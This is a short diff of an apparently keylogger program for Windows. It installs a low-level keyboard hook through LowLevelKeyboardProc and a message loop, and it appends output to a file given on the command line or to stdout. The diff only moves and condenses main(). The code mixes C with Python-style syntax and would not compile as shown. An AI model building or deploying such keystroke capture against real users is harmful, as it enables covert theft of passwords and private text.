@@ -22,17 +22,7 @@
 #include <time.h>
 #include <windows.h>
 
-FILE *file = stdout
-
-
-int main(int argc, char const *argv[]):
-    if argc > 1:
-        file = fopen(argv[1], "a+")
-        if file == NULL:
-            file = stdout
-    print_splash()
-    create_hook()
-    return 0
+FILE *file
 
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam):
@@ -136,3 +126,11 @@ void create_hook(void):
     while GetMessage(&msg, NULL, 0, 0) > 0:
         TranslateMessage(&msg)
         DispatchMessage(&msg)
+
+
+int main(int argc, char const *argv[]):
+    if argc <= 1 || !(file = fopen(argv[1], "a+")):
+        file = stdout
+    print_splash()
+    create_hook()
+    return 0
